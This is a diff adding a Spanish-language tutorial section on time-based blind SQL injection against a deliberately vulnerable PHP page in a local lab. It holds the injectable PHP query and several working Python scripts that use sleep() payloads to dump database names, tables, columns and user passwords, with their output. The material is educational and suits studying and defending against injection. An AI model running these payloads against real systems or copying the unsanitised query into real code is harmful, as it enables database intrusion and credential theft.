@@ -555,9 +555,224 @@ columns </span><span class="kd">=</span><span class="p"> [</span><span class="s2
     [</span><span class="na">*</span><span class="p">] vulnwhatsapp413</span>
 </code></pre></div></div><br>
 
+<br><div><strong><h3>SQL Injection Time Based</h3></strong></div><br>
 
-<blockquote><strong><div><p>¡Proximamente!</p></div></strong>
-<div><p>En cuanto tenga un poco mas de tiempo actualizaré el post agregando otros tipos de inyecciones como sql basada en tiempo</p></div></blockquote><br>
+<blockquote><strong><div><p>¡Tener en cuenta!</p></div></strong>
+<div><p>Los scripts como se puede ver son muy parecidos en boolean based y en time based, lo unico cambia el payload y el condicional</p></div>
+<li>Boolean based: se basa en si una cadena o no existe en la respuesta de la petición</li>
+<li>Time based: se basa el el tiempo que tarda en responder la petición</li></blockquote><br>
+
+<div><p>Modificamos el example.php eliminando lo que nos muestra el output, solo que se ejecute la query</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+
+$dbhostname </span><span class="kd">=</span><span class="s2"> 'localhost'</span><span class="p">;
+$dbuser </span><span class="kd">=</span><span class="s2"> 'user'</span><span class="p">;
+$dbpassword </span><span class="kd">=</span><span class="s2"> 'password'</span><span class="p">;
+$dbname </span><span class="kd">=</span><span class="s2"> 'example'</span><span class="p">;
+
+$connection </span><span class="kd">=</span><span class="k"> mysqli_connect</span><span class="p">($dbhostname, $dbuser, $dbpassword, $dbname);
+
+$input </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'id'</span><span class="p">];
+
+$query </span><span class="kd">=</span><span class="s2"> "SELECT id, role, username FROM users WHERE id='$input'"</span><span class="p">;
+
+$results </span><span class="kd">=</span><span class="k"> mysqli_query</span><span class="p">($connection, $query);
+
+?></span>
+</code></pre></div></div><br>
+
+<div><p>La idea es la misma que anterior pero en lugar de tomar un mensaje tomar el tiempo como base si la condicion se cumple que haga un sleep de varios segundos, como la siguiente query que cumple la condicion que el primer caracter de la base de datos es e por lo que tarda 5 segundos</p></div>
+<a href="./21.png" target="_blank"><div><p><img src="./21.png"><p></div></a><br>
+
+<div><p>Cuando la condicion no se cumple no tarda nada por ejemplo cambiamos por i</p></div>
+<a href="./22.png" target="_blank"><div><p><img src="./22.png"><p></div></a><br>
+
+<div><p>Sabiendo esto podemos crear un script que iterando por cada caracter basandose en el tiempo si se ejecuta el sleep y tarda mas de 2 segundos nos muestre el caracter correspondiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="kd">
+from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">string, requests, time
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">"Database"</span><span class="p">)
+
+value </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">
+
+</span><span class="kd">for </span><span class="p">position </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">20</span><span class="p">):
+    </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="p">characters:
+        tstr </span><span class="kd">=</span><span class="p"> time.time()
+        requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1' and if(substr(database(),{position},1)='{character}', sleep(2),1)-- -"</span><span class="p">)
+        tend </span><span class="kd">=</span><span class="p"> time.time()
+        </span><span class="kd">if </span><span class="p">(tend </span><span class="kd">-</span><span class="p"> tstr) </span><span class="kd">></span><span class="na"> 2</span><span class="p">:
+            value </span><span class="kd">+=</span><span class="p"> character
+            bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Al ejecutar el script nos devuelve la base de datos actualmente en uso</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Database: example</span>
+</code></pre></div></div><br>
+
+<div><p>Con la misma logica creamos uno que haga lo mismo, pero iterando sobre lineas y caracteres para dumpear las bases de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">string, requests, time
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase </span><span class="kd">+</span><span class="p"> string.punctuation
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">"Databases"</span><span class="p">)
+
+value </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">
+
+</span><span class="kd">for </span><span class="p">db </span><span class="kd">in</span><span class="k"> range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">5</span><span class="p">):
+    value </span><span class="kd">+=</span><span class="s2"> "\n\033[1;37m[\033[1;34m*\033[1;37m] "</span><span class="p">
+    </span><span class="kd">for </span><span class="p">position </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">20</span><span class="p">):
+        </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="p">characters:
+            tstr </span><span class="kd">=</span><span class="p"> time.time()
+            requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1'and if(substr((select schema_name from information_schema.schemata limit {db},1),{position},1)='{character}',sleep(2),1)-- -"</span><span class="p">)
+            tend </span><span class="kd">=</span><span class="p"> time.time()
+            </span><span class="kd">if</span><span class="p"> (tend </span><span class="kd">-</span><span class="p"> tstr) </span><span class="kd">></span><span class="na"> 2</span><span class="p">:
+                value </span><span class="kd">+=</span><span class="p"> character
+                bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Al ejecutar el script despues de un rato nos muestra todas las bases de datos existentes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Databases: 
+    [</span><span class="na">*</span><span class="p">] information_schema
+    [</span><span class="na">*</span><span class="p">] mysql
+    [</span><span class="na">*</span><span class="p">] performance_schema
+    [</span><span class="na">*</span><span class="p">] sys
+    [</span><span class="na">*</span><span class="p">] example</span>
+</code></pre></div></div><br>
+
+<div><p>Lo dicho modificamos el script para que liste las tablas de example en lugar de las bases de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">string, requests, time
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">"Tables"</span><span class="p">)
+
+value </span><span class="kd">=</span><span class="s2"> ""
+
+</span><span class="kd">for </span><span class="p">table </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">3</span><span class="p">):
+    value </span><span class="kd">+=</span><span class="s2"> "\n\033[1;37m[\033[1;34m*\033[1;37m] "</span><span class="p">
+    </span><span class="kd">for </span><span class="p">position </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">10</span><span class="p">):
+        </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="kd">characters:
+            tstr </span><span class="kd">=</span><span class="p"> time.time()
+            requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1'and if(substr((select table_name from information_schema.tables where table_schema='example' limit {table},1),{position},1)='{character}',sleep(2),1)-- -"</span><span class="p">)
+            tend </span><span class="kd">=</span><span class="p"> time.time()
+            </span><span class="kd">if </span><span class="p">(tend </span><span class="kd">-</span><span class="p"> tstr) </span><span class="kd">></span><span class="na"> 2</span><span class="p">:
+                value </span><span class="kd">+=</span><span class="p"> character
+                bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Al ejecutar el script nos mostrara la tabla users que es la unica existente en la db example</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Tables: 
+    [</span><span class="na">*</span><span class="p">] users</span>
+</code></pre></div></div><br>
+
+<div><p>Modificamos de nuevo el script para que itere sobre columnas en lugar de tablas, quedaria asi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">string, requests, time
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">"Columns"</span><span class="p">)
+
+value </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">
+
+</span><span class="kd">for </span><span class="p">column </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">5</span><span class="p">):
+    value </span><span class="kd">+=</span><span class="s2"> "\n\033[1;37m[\033[1;34m*\033[1;37m] "</span><span class="p">
+    </span><span class="kd">for </span><span class="p">position </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">10</span><span class="p">):
+        </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="p">characters:
+            tstr </span><span class="kd">=</span><span class="p"> time.time()
+            requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1'and if(substr((select column_name from information_schema.columns where table_schema='example' and table_name='users' limit {column},1),{position},1)='{character}',sleep(2),1)-- -"</span><span class="p">)
+            tend </span><span class="kd">=</span><span class="p"> time.time()
+            </span><span class="kd">if</span><span class="p"> (tend </span><span class="kd">-</span><span class="p"> tstr) </span><span class="kd">></span><span class="na"> 2</span><span class="p">:
+                value </span><span class="kd">+=</span><span class="p"> character
+                bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Al ejecutarlo nos muestra las columnas existentes de la tablas users de la db example</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Columns:
+    [</span><span class="na">*</span><span class="p">] id
+    [</span><span class="na">*</span><span class="p">] role
+    [</span><span class="na">*</span><span class="p">] username
+    [</span><span class="na">*</span><span class="p">] password</span>
+</code></pre></div></div><br>
+
+<div><p>Ahora iteramos por cada columna para dumpearla y conseguimos todos los datos de la db</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">string, requests, time
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase </span><span class="kd">+</span><span class="p"> string.digits </span><span class="kd">+</span><span class="p"> string.whitespace </span><span class="kd">+</span><span class="p"> string.punctuation
+
+columns </span><span class="kd">=</span><span class="p"> [</span><span class="s2">"id"</span><span class="p">, </span><span class="s2">"role"</span><span class="p">, </span><span class="s2">"username"</span><span class="p">, </span><span class="s2">"password"</span><span class="p">]
+
+</span><span class="kd">for </span><span class="p">column </span><span class="kd">in </span><span class="p">columns:
+    </span><span class="k">print</span><span class="p">(</span><span class="s2">"\r"</span><span class="p">)
+    bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="k">f</span><span class="s2">"Dumpeando columna {column}"</span><span class="p">)
+
+    value </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">
+
+    </span><span class="kd">for </span><span class="p">dump </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">5</span><span class="p">):
+        value </span><span class="kd">+=</span><span class="s2"> "\n\033[1;37m[\033[1;34m*\033[1;37m] "</span><span class="p">
+        </span><span class="kd">for </span><span class="p">position </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">18</span><span class="p">):
+            </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="p">characters:
+                tstr </span><span class="kd">=</span><span class="p"> time.time()
+                requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1'and if(substr((select {column} from example.users limit {dump},1),{position},1)='{character}',sleep(2),1)-- -"</span><span class="p">)
+                tend </span><span class="kd">=</span><span class="p"> time.time()
+                </span><span class="kd">if </span><span class="p">(tend </span><span class="kd">-</span><span class="p"> tstr) </span><span class="kd">></span><span class="na"> 2</span><span class="p">:
+                    value </span><span class="kd">+=</span><span class="p"> character
+                    bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Finalmente lo ejecutamos y ya tendriamos nuestro objetivo final basandonos en tiempo</p></div><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Dumpeando columna id:
+    [</span><span class="na">*</span><span class="p">] 1
+    [</span><span class="na">*</span><span class="p">] 2
+    [</span><span class="na">*</span><span class="p">] 3
+    [</span><span class="na">*</span><span class="p">] 4
+    [</span><span class="na">*</span><span class="p">] 5
+
+[</span><span class="na">◢</span><span class="p">] Dumpeando columna role:
+    [</span><span class="na">*</span><span class="p">] noob
+    [</span><span class="na">*</span><span class="p">] hacker
+    [</span><span class="na">*</span><span class="p">] hacker
+    [</span><span class="na">*</span><span class="p">] pro hacker
+    [</span><span class="na">*</span><span class="p">] elite hacker
+
+[</span><span class="na">◢</span><span class="p">] Dumpeando columna username:
+    [</span><span class="na">*</span><span class="p">] gatogamer1155
+    [</span><span class="na">*</span><span class="p">] 0bfxgh0st
+    [</span><span class="na">*</span><span class="p">] eddiedota
+    [</span><span class="na">*</span><span class="p">] txhaka
+    [</span><span class="na">*</span><span class="p">] pascualropi
+
+[</span><span class="na">◢</span><span class="p">] Dumpeando columna password:
+    [</span><span class="na">*</span><span class="p">] gatogamer123!
+    [</span><span class="na">*</span><span class="p">] ghost1337!
+    [</span><span class="na">*</span><span class="p">] alvarovazques69!
+    [</span><span class="na">*</span><span class="p">] password123
+    [</span><span class="na">*</span><span class="p">] vulnwhatsapp413</span>
+</code></pre></div></div><br>
+
+<blockquote><strong><div><p>¡Importante!</p></div></strong>
+<div><p>La idea no es reutilizarar el script en todos los casos porque puede que haya cambio, la idea es entender la logica de la sintaxis de sql, las comparaciones y en que se basan los condicionales</p></div></blockquote><br>
 
 <p><a href="./../../">Página Principal</a></p>
 
